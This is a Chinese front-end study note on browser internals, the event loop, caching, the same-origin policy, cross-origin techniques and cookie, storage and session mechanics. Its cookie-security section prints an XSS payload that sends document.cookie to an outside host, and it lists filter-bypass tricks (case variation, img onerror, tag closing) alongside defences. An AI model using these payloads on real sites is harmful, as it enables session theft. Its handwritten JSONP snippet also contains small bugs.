### 跨域问题


## 浏览器

### 浏览器内核

浏览器内核分为两个部分: 渲染引擎(render engin)、js引擎(js engin)

* 渲染引擎：负责对网页语法的解释（HTML、javaScript、引入css等），并渲染（显示）网页
* js引擎：javaScript的解释、编译、执行

主流内核:

| 浏览器 | IE | FireFox | Chrome Opera | Safari | Edeg |
| --- | --- | --- | --- | --- | --- |
| 内核 |  Trident | Gecko | Blink | Webkit | 基于Chromium开发 |

webkit浏览器内核
![avator](https://user-gold-cdn.xitu.io/2018/12/3/16771e08d735e0be?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)

* HTML解释器：解释HTML文本的解释器，主要作用是将HTML文本解释成DOM树，DOM是一种文档表示方法。
* CSS解释器：级联样式表的解释器，它的作用是为DOM中的各个元素对象计算出样式信息，从而为计算最后网页的布局提供基础设施。
* 布局：在DOM创建之后，webkit需要将其中的元素对象同样式信息结合起来，计算它们的大小位置等布局信息，形成一个能够表示这所有信息的内部比偶表示模型。
* JavaScript引擎：使用JavaScript代码可以修改网页的内容，也能修改CSS的信息，JavaScript引擎能解释JavaScript代码并通过DOM接口和CSSOM视图模式来修改网页内容和样式信息，从而改变渲染结果。
* 绘图：使用图形库将布局计算后的各个网页的节点绘制成图像结果。

相关问题:
1. 为什么说transform实现动画较直接设置几何属性性能较好？

    * webkit渲染过程：style -> Layout(reflow发生在这) -> Paint（repaint发生在这） -> Composite，transform是位于’Composite（渲染层合并）‘，而width、left、margin等则是位于‘Layout（布局）’层，这必定导致reflow。
    * 现代浏览器针对transform等开启GPU加速。

2. Google Chromium 为什么要从 WebKit 中抽离，新建一个 Blink 分支？

   Google 认为 Apple 在实现标准方面过于保守，Google 则更乐于实现各种草案标准，即使该标准处于 Working Draft 甚至是 Editor Draft 阶段，未来面临大改甚至废弃的可能。

   Webkit始终是由苹果主导的项目，其目标是为苹果MAC OS以及iOS提供一个高效的浏览器渲染内核。相对于Google ,苹果是一家更传统的公司，其主要收入来自其硬件产品的销售。虽然苹果也对Web有着很大的兴趣，但和谷歌对Web的狂热相比，苹果更倾向于建立硬件+软件+iTunes的封闭生态系统，浏览器不是其重心。

小知识点:
* WebKit 是一个开源的浏览器引擎。它的前身是KDE在1998年开发的排版引擎KHTML，最初用于Linux和Unix等开源操作系统。因为KHTML拥有更清晰的架构，而且比Gecko更小巧，苹果从KHTML分支出来内部开始了WebKit的研发。
* webkit内核默认js引擎为javascriptCore，而谷歌把其替换成了v8，所以原先Chrome浏览器虽然也是webkit内核（Chromium项目中研发的渲染引擎，基于并脱离Webkit），用的是v8引擎，而sfari浏览器内使用的webkit内核，其js引擎依旧是javascriptCore.
* Chromium 是 Google 公司一个开源浏览器项目，使用 Blink 渲染引擎驱动。Chromium是基于Webkit，衍生出Blink。Chromium 和 Google Chrome 的关系，可以理解为：Chromium + 集成 Google 产品 = Google Chrome。可以理解为 Google Chrome 是个商业项目，而 Chromium 是一个中立、无立场的（理论上）的开源项目。微软基于 Google 的 Chromium 开发的新版 Microsoft Edge 浏览器已经正式发布。
* CEF（Chromium Embeded Framework）
  一个将浏览器功能（页面渲染、js执行）嵌入到其他应用程序的框架，支持windows, Linux, Mac平台
  应用: 做一个浏览器、跨平台的桌面底层方案electron.js、 客户端（如：桌面端app应用）
  好处：开发web和native混合的应用非常方便

### 从浏览器的多进程到js的单线程
注: 
1. **进程是cpu资源分配的最小单位（是能拥有资源和独立运行的最小单位，系统会给它分配内存），不同进程之间也可以通信，不过代价较大**
2. **线程是cpu调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）同一进程下的各个线程之间共享程序的内存空间（包括代码段、数据集、堆等），现在，一般通用的叫法：单线程与多线程，都是指在一个进程内的单和多。**

**现代浏览器基本上都是多进程的（早期浏览器是单进程的，因为多进程有更高的资源占用和更复杂的体系架构，但相对于单进程浏览器的不稳定，不流畅，不安全问题，多进程浏览器通过多进程，安全沙箱，进程之间的隔离等方法了，解决了单进程浏览器中存在的各种问题），浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存），简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。**

##### 浏览器主要进程
1. Browser进程：浏览器的主进程（负责协调、主控），只有一个。作用有
    * 负责浏览器界面显示，与用户交互。如前进，后退等
    * 负责各个页面的管理，创建和销毁其他进程
    * 将Renderer进程得到的内存中的Bitmap，绘制到用户界面上
    * 网络资源的管理，下载等
2. 第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建
3. GPU进程：最多一个，用于3D绘制等
4. 浏览器渲染进程（浏览器内核，Renderer进程，内部是多线程的）：默认每个Tab页面一个进程，互不影响。主要作用为：页面渲染，脚本执行，事件处理等

当然，浏览器有时会将多个进程合并（譬如打开多个空白标签页后，会发现多个空白标签页被合并成了一个进程）

##### 浏览器多进程的优势

* 避免单个page crash影响整个浏览器
* 避免第三方插件crash影响整个浏览器
* 多进程充分利用多核优势
* 方便使用沙盒模型隔离插件等进程，提高浏览器稳定性

当然，多进程浏览器内存等资源消耗也会更大，有点空间换时间的意思

##### 浏览器内核(渲染进程)
页面的渲染，JS的执行，事件的循环，都在这个进程内进行。浏览器的渲染进程是多线程的。
其主要包含线程：
1. GUI渲染线程
    * 负责渲染浏览器界面，解析HTML，CSS，构建DOM树和RenderObject树，布局和绘制等。
    * 当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时，该线程就会执行
    * 注意，**GUI渲染线程与JS引擎线程是互斥的**，当JS引擎执行时GUI线程会被挂起（相当于被冻结了），GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。

2. JS引擎线程
    * 也称为JS内核，负责处理Javascript脚本程序的主线程。（例如V8引擎）
    * JS引擎线程负责解析Javascript脚本，运行代码。
    * JS引擎一直等待着任务队列中任务的到来，然后加以处理，一个Tab页（renderer进程）中无论什么时候都只有一个JS线程在运行JS程序
    * 同样注意，**GUI渲染线程与JS引擎线程是互斥的**，所以如果JS执行的时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞。
    * **永远只有JS引擎线程在执行JS脚本程序，事件触发线程、定时触发器线程和异步http请求线程只负责将满足触发条件的处理函数推进事件队列，等待JS引擎线程执行， 不参与代码解析与执行。**
3. 事件触发线程
    * 归属于浏览器而不是JS引擎，用来控制事件循环（可以理解，JS引擎自己都忙不过来，需要浏览器另开线程协助）
    * 当JS引擎执行代码块如setTimeOut时（也可来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件线程中
    * 当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理
    * 注意，由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行）
4. 定时触发器线程
    * setInterval与setTimeout所在线程
    * 浏览器定时计数器并不是由JavaScript引擎计数的,（因为JavaScript引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确）
    * 因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待JS引擎空闲后执行）
    * 注意，W3C在HTML标准中规定，规定要求setTimeout中低于4ms的时间间隔算为4ms。
5. 异步http请求线程
    * 在XMLHttpRequest在连接后是通过浏览器新开一个线程请求
    * 将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将这个回调再放入事件队列中。再由JavaScript引擎执行。

##### Browser进程和浏览器内核（Renderer进程）的通信过程
任务管理器中出现了两个进程（一个是主控进程，一个则是打开Tab页的渲染进程）

1. Browser进程收到用户请求，首先需要获取页面内容（譬如通过网络下载资源），随后将该任务通过RendererHost接口传递给Render进程
2. Renderer进程的Renderer接口收到消息，简单解释后，交给渲染线程，然后开始渲染
    * 渲染线程接收请求，加载网页并渲染网页，这其中可能需要Browser进程获取资源和需要GPU进程来帮助渲染
    * 当然可能会有JS线程操作DOM（这样可能会造成回流并重绘）
    * 最后Render进程将结果传递给Browser进程
3. Browser进程接收到结果并将结果绘制出来

##### 浏览器内核中线程之间的关系

1. GUI渲染线程与JS引擎线程互斥
  由于JavaScript是可操纵DOM的，如果在修改这些元素属性同时渲染界面（即JS线程和UI线程同时运行），那么渲染线程前后获得的元素数据就可能不一致了。
  因此为了防止渲染出现不可预期的结果，浏览器设置GUI渲染线程与JS引擎为互斥的关系，当JS引擎执行时GUI线程会被挂起，
  GUI更新则会被保存在一个队列中等到JS引擎线程空闲时立即被执行。
2. JS阻塞页面加载
  从上述的互斥关系，可以推导出，JS如果执行时间过长就会阻塞页面。
  譬如，假设JS引擎正在进行巨量的计算，此时就算GUI有更新，也会被保存到队列中，等待JS引擎空闲后执行。
  然后，由于巨量计算，所以JS引擎很可能很久很久后才能空闲，自然会感觉到巨卡无比。
  所以，要尽量避免JS执行时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞的感觉。
3. WebWorker，JS的多线程
  JS引擎是单线程的（对于cpu密集型计算压力很大），而且JS执行时间过长会阻塞页面。
  HTML5中支持了Web Worker:
    * 创建Worker时，JS引擎向浏览器申请开一个子线程（子线程是浏览器开的，完全受主线程控制，而且不能操作DOM）
    * JS引擎线程与worker线程间通过特定的方式通信（postMessage API，需要通过序列化对象来与线程交互特定的数据）

    所以，如果有非常耗时的工作，请单独开一个Worker线程，这样里面不管如何翻天覆地都不会影响JS引擎主线程，
  只待计算出结果后，将结果通信给主线程即可
  JS引擎是单线程的，这一点的本质仍然未改变，Worker可以理解是浏览器给JS引擎开的外挂，专门用来解决那些大量计算问题。
4. WebWorker与SharedWorker
  WebWorker只属于某个页面，不会和其他页面的Render进程（浏览器内核进程）共享（所以Chrome在Render进程中
  （每一个Tab页就是一个render进程）创建一个新的线程来运行Worker中的JavaScript程序。）
  SharedWorker是浏览器所有页面共享的，不能采用与Worker同样的方式实现，因为它不隶属于某个Render进程，可以为多个Render进程共享使用
  （所以Chrome浏览器为SharedWorker单独创建一个进程来运行JavaScript程序，在浏览器中每个相同的JavaScript只存在一个SharedWorker进程，不管它被创建多少次。）

##### 简单梳理下浏览器渲染流程
1. 浏览器输入url，浏览器主进程接管，开一个下载线程，
然后进行 http请求（略去DNS查询，IP寻址等等操作），然后等待响应，获取内容，随后将内容通过RendererHost接口转交给Renderer进程
2. 解析html建立dom树
3. 解析css构建render树（将CSS代码解析成树形的数据结构，然后结合DOM合并成render树）
4. 布局render树（Layout/reflow），负责各元素尺寸、位置的计算
5. 绘制render树（paint），绘制页面像素信息
6. 浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上。

##### load事件与DOMContentLoaded事件的先后
* 当 DOMContentLoaded 事件触发时，仅当DOM加载完成，不包括样式表，图片(譬如如果有async加载的脚本就不一定完成)。
* 当 onload 事件触发时，页面上所有的DOM，样式表，脚本，图片都已经加载完成了。（渲染完毕了）

所以，顺序是：DOMContentLoaded -> load

#### 普通图层和复合图层

渲染步骤中就提到了composite概念。

可以简单的这样理解，浏览器渲染的图层一般包含两大类：普通图层以及复合图层

首先，普通文档流内可以理解为一个复合图层（这里称为默认复合层，里面不管添加多少元素，其实都是在同一个复合图层中）

其次，absolute布局（fixed也一样），虽然可以脱离普通文档流，但它仍然属于默认复合层。

然后，可以通过硬件加速的方式，声明一个新的复合图层，它会单独分配资源
（当然也会脱离普通文档流，这样一来，不管这个复合图层中怎么变化，也不会影响默认复合层里的回流重绘）

可以简单理解下：**GPU中，各个复合图层是单独绘制的**，所以互不影响，硬件加速效果很棒。

可以Chrome源码调试 -> More Tools -> Rendering -> Layer borders中看到，黄色的就是复合图层信息

##### 如何变成复合图层（硬件加速）

* 最常用的方式：translate3d、translateZ
* opacity属性/过渡动画（需要动画执行的过程中才会创建合成层，动画没有开始或结束后元素还会回到之前的状态）
* will-chang属性（这个比较偏僻），一般配合opacity与translate使用（而且经测试，除了上述可以引发硬件加速的属性外，其它属性并不会变成复合层），作用是提前告诉浏览器要变化，这样浏览器会开始做一些优化工作（这个最好用完后就释放）
* \<video>\<iframe>\<canvas>\<webgl>等元素
* 其它，譬如以前的flash插件

##### absolute和硬件加速的区别
可以看到，absolute虽然可以脱离普通文档流，但是无法脱离默认复合层。

所以，就算absolute中信息改变时不会改变普通文档流中render树，但是，浏览器最终绘制时，是整个复合层绘制的，所以absolute中信息的改变，仍然会影响整个复合层的绘制。（浏览器会重绘它，如果复合层中内容多，absolute带来的绘制信息变化过大，资源消耗是非常严重的）

而硬件加速直接就是在另一个复合层了（另起炉灶），所以它的信息改变不会影响默认复合层（当然了，内部肯定会影响属于自己的复合层），仅仅是引发最后的合成（输出视图）

##### 复合图层的缺点

大量使用复合图层，否则由于资源消耗过度，页面反而会变的更卡

##### 硬件加速时请使用index

使用硬件加速时，尽可能的使用index，防止浏览器默认给后续的元素创建复合层渲染

具体的原理时这样的：
**webkit CSS3中，如果这个元素添加了硬件加速，并且index层级比较低，那么在这个元素的后面其它元素（层级比这个元素高的，或者相同的，并且releative或absolute属性相同的），会默认变为复合层渲染，如果处理不当会极大的影响性能**

简单点理解，其实可以认为是一个隐式合成的概念：如果a是一个复合图层，而且b在a上面，那么b也会被隐式转为一个复合图层，这点需要特别注意

#### 从Event Loop谈JS的运行机制

同步任务都在主线程上执行，形成一个执行栈。事件触发线程管理着一个任务队列，只要异步任务有了运行结果，就在任务队列之中放置一个事件。

浏览器为了能够使得JS内部macrotask与DOM任务能够有序的执行，会在一个macrotask执行结束后，在下一个 macrotask 执行开始前（之前macrotask中产生的microtask也会先执行完），对页面进行重新渲染。

macrotask中的事件都是放在一个事件队列中的，而这个队列由事件触发线程维护，microtask中的所有微任务都是添加到微任务队列（Job Queues）中，等待当前macrotask执行完毕后执行，而这个队列由JS引擎线程维护（这点由自己理解+推测得出，因为它是在主线程下无缝执行的）

![宏任务微任务渲染时机](https://user-gold-cdn.xitu.io/2020/1/18/16fb7adf5afc036d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)

![完整Event Loop](https://user-gold-cdn.xitu.io/2020/1/18/16fb7ae3b678f1ea?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)


### 浏览器缓存策略

##### 浏览器缓存位置和优先级

1. **Service Worker**
    Service Worker 是浏览器在后台独立于网页运行的脚本，其无法直接访问Dom，可以通过 postMessage 接口发送消息来与其控制的页面通信，可以在这个线程中缓存文件（可以通过编辑拦截请求和返回，控制缓存的规则），并且该缓存是持续性的

2. **Memory Cache(内存缓存)**
    内存缓存不是持续性的，缓存会随着进程释放而释放

3. **Disk Cache(硬盘缓存)**
    持续性缓存，并且容量更优，它会根据HTTP header的字段判断哪些资源需要缓存

4. **Push Cache(推送缓存)**
    推送缓存是HTTP/2的内容，目前应用较少

##### 强缓存（不需要向服务器询问的缓存）

###### Expires
过期时间，会在设置的时间之后失效

###### Cache-Control
HTTP/1.1新增字段，`Cache-Control`可以通过`max-age`设置过期时间，如果设置`Cache-Control: no-cache，no-store, must-revalidate`；浏览器则不会做任何缓存。`Cache-Control`会覆盖`Expires`的设置(它会覆盖其他的一切缓存规则)

##### 协商缓存（需要向服务器询问缓存是否已经过期）
###### Last-Modified
最后修改的时间，浏览器第一次请求资源时，服务器会在响应头上加 `Last-Modified`，当浏览器再次加载该资源时，浏览器会在请求头中带上`If-Modified-Since`字段，值就是`Last-Modified`的值，服务器会比对两个时间，若相同则返回304，否则返回新资源，并更新`Last-Modified`。

###### ETag
HTTP/1.1新增字段，表示资源唯一表示，只要资源改动，就会重新计算`ETag`，缓存流程和`Last-Modified`一样，只是它是想服务器发送请求头中带`If-none-Match`字段，如果`ETag`字段不匹配，说明资源已经改变，返回新资源并更新`ETag`，若匹配则返回304。

**ETag 比 Last-Modified 更准确**:打开资源但是并未更改，Last-Modified也会更改，并且Last-Modified的单位时间为秒，如果更改文件的一秒内请求资源，还会命中缓存。
**如果什么缓存策略都没有设置，那么浏览器会取响应头中的Date减去Last-Modified值的10%做为缓存时间**

### 同源策略
浏览器的同源策略限制一个origin的文档或者它加载的脚本如何能与另一个源的资源进行交互。

它为了保证用户信息的安全，防止恶意的网站窃取数据，阻隔恶意文档，减少可能被攻击的媒介。

其中同源指的是:**协议相同、域名相同、端口相同**

限制范围包括:
* Cookie（针对cookie的同源策略只关注域名，忽略协议和端口）、LocalStorage 和 IndexDB 无法读取
* DOM 无法获得
* AJAX 请求不能发送

##### 如何绕过同源策略，共享cookie（强调!同源策略针对Cookie，只关注域名，忽略协议和端口）

Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置`document.domain`共享 Cookie。

另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如.example.com。 

```html
Set-Cookie: key=value; domain=.example.com; path=/
```

这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。

##### 如何绕过同源策略，操控iframe
如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源政策，操控iframe，拿到DOM。

但是对于完全不同源的网站，可以通过以下方法实现跨域窗口的通信

* 片段识别符
* window.name
* 跨文档通信API（Cross-document messaging）

##### 片段识别符实现跨域窗口通信
片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如http://example.com/x.html#fragment的#fragment。如果只是改变片段标识符，页面不会重新刷新。

父窗口可以把信息，写入子窗口的片段标识符。

```javascript
var src = originURL + '#' + data;
document.getElementById('myIFrame').src = src;
//子窗口通过监听hashchange事件得到通知。
window.onhashchange = checkMessage;
function checkMessage() {
  var message = window.location.hash;
  // ...
}
```

同样的，子窗口也可以改变父窗口的片段标识符。

```javascript
parent.location.href= target + "#" + hash;
```

##### window.name实现跨域窗口通信
浏览器窗口有window.name属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。

这种方法的优点是，window.name容量很大，可以放置非常长的字符串；缺点是必须监听子窗口window.name属性的变化，影响网页性能。

##### window.postMessage
HTML5引入了window.postMessage，允许跨窗口通信，不论这两个窗口是否同源。

父窗口http://aaa.com向子窗口http://bbb.com发消息，调用postMessage方法

```javascript
var popup = window.open('http://bbb.com', 'title');
popup.postMessage('Hello World!', 'http://bbb.com');
```

postMessage方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即"协议 + 域名 + 端口"。也可以设为*，表示不限制域名，向所有窗口发送。

子窗口向父窗口发送消息的写法类似

```javascript
window.opener.postMessage('Nice to see you', 'http://aaa.com');
```

父窗口和子窗口都可以通过message事件，监听对方的消息。

```javascript
window.addEventListener('message', function(e) {
  console.log(e.data);
},false);
```

message事件的事件对象event，提供以下三个属性。

* event.source：发送消息的窗口
* event.origin: 消息发向的网址
* event.data: 消息内容

#### 如何绕过同源策略，和其他页面共享LocalStorage

通过window.postMessage，读写其他窗口的 LocalStorage 也成为了可能。


#### 如何绕过同源策略，向跨源服务器发送AJAX
除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制:

* JSONP
* WebSocket
* CROS

###### JSONP
script标签jsonp跨域，原因script标签，img标签等不受同源策略限制

手写JSONP

```javascript
(function (window,document){
  'use strict'
  const jsonp = function(url,data,callback){
    let dataString = url.indexOf('?') ? '&' : '?';
    for (let key in data) {
      dataString += `${key}=${data[key]}&`;
    }
    const jsonp_cb = Math.random.toString.replace('.', '');
    dataString += `callback=${jsonp_cb}`;
    const scriptDom = document.createElement('script');
    scriptDom.src = `${url + dataString}`;
    window[jsonp_cb] = function (data){
      callback(data);
      document.body.removeChild(scriptDom);
    }
    document.body.appendChild(scriptDom);
  }
  window.$jsonp = jsonp;
})(window, document);
```

###### WebSocket
WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

###### CORS
CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。

CORS是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。

## Cookie LocalStorage SessionStorage Session

#### cookie localStorage sessionStorage三者区别

* **容量方面**: localStorage 和 sessionStorage均为5M左右，cookie在不同的浏览器中每个域的数量和大小均不同，不过硬尽量保证数量小于20(ie7+, chrome, firefox最小50个，safari不限制)，大小应尽量小于4k
* **时效性（声明周期）** localStroage和sessionStorage都以文件的形式存储在本地（硬盘），localStorage存储的数据是永久性的，除非用户人为删除否则一直存在，而sessionStorage是会话级别的本地保存，其标签关闭数据也会被清除。cookie一般由服务器生成，可设置失效时间，如果在浏览器端生成cookie或未设置时效时间，默认关闭浏览器后失效。
* **作用域** localStorage同一浏览器中，同源文档可以共享localStorage数据，而sessionStorage则是只有同一浏览器，同一窗口的同源文档才能共享数据（统一标签窗口不同的iframe也可以共享数据）。

#### 三者相同
* 都受浏览器同源策略限制（不过针对cookie的同源策略，只关注域名和端口，忽略协议）

#### Cookie
因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。所以，需要额外的数据用于维护会话。

Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求（同源）被发送到服务器，所以应该保证它不要太大。

cookie分为 会话cookie 和 持久cookie ，会话cookie是指在不设定它的生命周期 expires 时的状态，浏览器的开启到关闭就是一次会话，当关闭浏览器时，会话cookie就会跟随浏览器而销毁。

两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，http://example.com设置的 Cookie，可以被https://example.com读取。

##### Set-Cookie
响应首部 Set-Cookie 被用来由服务器端向客户端发送 cookie。

指令:
1. \<cookie-name>=\<cookie-value> 键值对
2. Expires=\<date> 
  cookie 的最长有效时间，形式为符合 HTTP-date 规范的时间戳。如果没有设置这个属性，那么表示这是一个会话期 cookie 。一个会话结束于客户端被关闭时，这意味着会话期 cookie 在彼时会被移除。然而，很多Web浏览器支持会话恢复功能，这个功能可以使浏览器保留所有的tab标签，然后在重新打开浏览器的时候将其还原。与此同时，cookie 也会恢复，就跟从来没有关闭浏览器一样。
3. Max-Age=\<non-zero-digit> 
  在 cookie 失效之前需要经过的秒数。秒数为 0 或 -1 将会使 cookie 直接过期。一些老的浏览器（ie6、ie7 和 ie8）不支持这个属性。对于其他浏览器来说，假如二者 （指 Expires 和Max-Age） 均存在，那么 Max-Age 优先级更高。
4. Domain=\<domain-value>
  Domain属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如www.example.com会设为example.com，而且以后如果访问example.com的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在Set-Cookie字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。
5. Path=\<path-value> 
  Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，PATH属性是/，那么请求/docs路径也会包含该 Cookie。当然，前提是域名必须一致。
6. Secure
  一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。
  注意： 非安全站点（http:）已经不能再在 cookie 中设置 secure 指令了（在Chrome 52+ and Firefox 52+ 中新引入的限制）。
7. HttpOnly
  设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  Document.cookie 属性、XMLHttpRequest 和  Request APIs 进行访问，以防范跨站脚本攻击（XSS）。
8. SameSite=Strict、SameSite=Lax、SameSite=None
  允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。
  Strict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
  Lax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。
  Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。

##### Cookie的安全问题

XSS(Cross-Site Scripting，跨站脚本攻击)是一种代码注入攻击。 攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。 利用这些恶意脚本，攻击者可获取用户的敏感信息如Cookie、SessionID 等，进而危害数据安全。

XSS攻击可能会窃取网页浏览中的cookie值、劫持流量实现恶意跳转等。

例如:

```javascript
<script>
  new Image().src =
      "http://jehiah.com/_sandbox/log.cgi?c=" + encodeURI(document.cookie);
</script>
```
如果将这段代码插入到某个登陆用户的页面，则Cookie就会通过 HTTP 请求发送给给指定服务，然后就可以伪造那个可怜的登陆用户了

**解决**：
* 对用户输入内容设置过滤规则。
* 任何私密数据都不应保存在cookie中。登录功能在cookie只保留一个session id，同时服务端要做好常规的安全检验（不停地重设session的重设；将过期时间设置短一些；监控referrer与userAgent的值）。
* 使用HttpOnly禁止脚本读取Cookie。（如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的，对于 document.cookie 来说是透明的。）

**注意，上面的情况也能绕过**
* 大小写绕过
  这个绕过方式的出现是因为网站仅仅只过滤了\<script>标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。
* 并不是只有script标签才可以插入代码
  `<img src='w.123' onerror='alert("hey!")'>`指定的图片地址根本不存在也就是一定会发生错误，这时候onerror里面的代码自然就得到了执行。
* 主动闭合标签实现注入代码

#### Session
Session是无状态的HTTP协议下，服务端记录用户状态时用于标识具体用户的机制。它是在服务端保存的用来跟踪用户的状态的数据结构，可以保存在文件、数据库或者集群中。

在浏览器关闭后这次的Session就消失了，下次打开就不再拥有这个Session。其实并不是Session消失了，而是Session ID变了，服务器端可能还是存着你上次的Session ID及其Session 信息，只是他们是无主状态，也许一段时间后会被删除。

大多数的应用都是用Cookie来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在Cookie里面记录一个SessionID，以后每次请求把这个会话ID发送到服务器。

session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能考虑到减轻服务器性能方面，应当使用cookie。

#### Session 和 Cookie 的关系与区别

* Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中，Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。
* Cookie的安全性一般，他人可通过分析存放在本地的Cookie并进行Cookie欺骗。在安全性第一的前提下，选择Session更优。重要交互信息比如权限等就要放在Session中，一般的信息记录放Cookie就好了。
* 单个Cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个Cookie
* 当访问增多时，Session会较大地占用服务器的性能。考虑到减轻服务器性能方面，应当适时使用Cookie。
* Session的运行依赖Session ID，而Session ID是存在 Cookie 中的。也就是说，如果浏览器禁用了Cookie,Session也会失效（但是可以通过其它方式实现，比如在url中传递Session ID,即sid=xxxx）。

#### 浏览器全面禁用第三方Cookie

**第三方Cookie**
第一方Cookie是由当前网站域所设置的Cookie,第三方Cookie来源于当前网页上嵌入的广告或图片等其他域来源。第一方Cookie和第三方Cookie都是网站在客户端上存放的一小块数据，它们都由某个域存放，只被这个域访问，它们的区别并不是技术上的区别，而是使用方式的区别。

例如你再访问天猫的情况下，会发现它的Cookie不都是.tmall.com这个域下面的，还有很多其他域下的cookie，这些cookie就是第三方cookie

**第三方cookie的用途**
* 前端日志打点
* 用户行为追踪（获取用户信息）

**浏览器禁用第三方Cookie之后**
* 使用第一方Cookie替代第三方Cookie，将设置的Cookie通过参数发给第三方
* 浏览器指纹（是一种通过浏览器对网站可见的配置和设置信息来跟踪Web浏览器的方法）


## 浏览器从发送请求到展示页面的过程

[非常完整的从输入URL到页面加载的过程](https://segmentfault.com/a/1190000013662126)

1. 解析域名

    浏览器先查询hosts文件是否有与这个域名对应的ip地址，如果有则直接向这个ip地址发起http请求。如果没有，浏览器向本地DNS服务器发出解析域名的DNS解析报文，本地DNS服务器收到请求后，先查询缓存，判断是否有对应的记录，如果有就返回这条记录，如果没有，本地DNS服务器于是就向DNS根服务器发起查询请求。

    现在的互联网是采用了树型的分层的分布式域名解析服务器集群来完成的。如果这一级的DNS服务器上找不到，则会进一步向上一级的DNS发去查询请求。直到根域名服务器为止。如果中间找到了对应的公网Ip，则再一级一级返回，如果找不到则返回错误信息。域名解析失败。

2. 通过ip查找服务器，找到服务器，建立TCP连接

    分为三步，也叫TCP三次握手：

    * TCP连接请求方，也就是客户端会发送一个请求建立连接的syn包（syn=x）给服务器；
    * 服务器接受到建立连接的请求syn包后，会回复一个确认包。其中有参数ACK=x+1。同时它自己还会再发一个SYN包，这里的SYN=y，并为这次连接分配资源；
    * 客户端接收到服务器端发送来的确认建立连接请求的包后，再次回复一个确认包。这里的ACK=y+1，并分配资源。到了这里，客户端和服务端之间的链接就已经建立起来了。
    在此之后，浏览器开始向服务器发送http请求，请求数据包。请求信息包含一个头部和一个请求体。

    服务器做出响应，返回浏览器需要的相应格式的数据。（即html）

    在响应结果中都有一个HTTP状态码：
    | 类别 | 原因 |
    | --- | --- |
    | 1**	| 信息性状态码 |
    | 2** |	成功状态码 |
    | 3**	| 重定向状态码 |
    | 4** | 客户端错误状态码 |
    | 5**	| 服务器错误状态码 |

3. 关闭TCP连接
为了避免服务器与客户端双方的资源占用和损耗，当双方没有请求或响应传递时，任意一方都可以发起关闭请求。与创建TCP连接的3次握手类似，关闭TCP连接，需要4次握手。

4. 浏览器渲染
    准确地说，浏览器需要加载解析的不仅仅是HTML，还包括CSS、JS。以及还要加载图片、视频等其他媒体资源。

